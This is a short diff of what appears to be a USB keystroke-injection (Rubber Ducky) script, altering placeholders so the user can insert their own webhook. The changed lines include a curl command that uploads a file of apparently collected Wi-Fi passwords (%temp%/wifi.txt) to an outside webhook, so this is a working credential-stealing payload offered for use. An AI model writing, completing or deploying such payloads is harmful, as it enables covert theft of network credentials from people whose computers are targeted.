@@ -6,7 +6,7 @@ DELAY 300
 
 ENTER
 DELAY 550
-STRING SET w=a
+STRING SET w=YOUR_WEBHOOK_HERE
 DELAY 50
 ENTER
 
@@ -54,7 +54,7 @@ DELAY 100
 ENTER
 DELAY 5500
 
-STRING curl -X POST -H "Content-Type: multipart/form-data" -F "file1=@%temp%/wifi.txt" a
+STRING curl -X POST -H "Content-Type: multipart/form-data" -F "file1=@%temp%/wifi.txt" YOUR_WEBHOOK_HERE
 ENTER
 DELAY 1000
 
